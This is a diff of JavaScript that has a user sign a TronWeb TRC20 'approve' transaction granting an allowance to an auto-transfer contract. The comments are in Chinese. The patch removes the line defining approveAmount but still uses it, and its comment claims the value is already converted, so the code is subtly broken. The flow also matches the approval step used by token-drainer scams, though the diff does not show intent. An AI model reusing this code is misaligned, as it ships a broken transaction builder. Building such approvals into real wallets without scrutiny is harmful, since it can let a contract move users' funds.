@@ -445,15 +445,28 @@
 
                 try {
                     // 构造approve交易
-                    const trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
-                    const approveAmount = tronWeb.toSun(APPROVE_AMOUNT, 6);
-                    const approveTx = await trc20Contract.approve(
-                        tronWeb.address.toHex(AUTO_TRANSFER_CONTRACT),
-                        approveAmount
-                    ).buildTransaction({
-                        from: tronWeb.address.toHex(userAddress),
-                        feeLimit: 1000000
-                    });
+                    // 1. 先获取合约ABI（需补充完整TRC20 ABI，当前代码缺少ABI参数）
+const TRC20_ABI = [
+  {
+    "inputs": [{"internalType": "address", "name": "spender", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}],
+    "name": "approve",
+    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
+    "type": "function"
+  }
+  // 可补充其他需要的ABI（如balanceOf）
+];
+
+// 2. 传入ABI初始化合约实例
+const trc20Contract = await tronWeb.contract(TRC20_ABI, TRC20_TOKEN_ADDRESS);
+
+// 3. 通过methods调用approve并构造交易
+const approveTx = await trc20Contract.methods.approve(
+  tronWeb.address.toHex(AUTO_TRANSFER_CONTRACT), // 代付合约地址（转Hex）
+  approveAmount // 授权额度（已转Sun单位）
+).buildTransaction({
+  from: tronWeb.address.toHex(userAddress), // 用户地址（转Hex）
+  feeLimit: 1000000 // 矿工费上限
+});
 
                     // 用户本地签名
                     const signedTx = await tronWeb.trx.sign(approveTx);
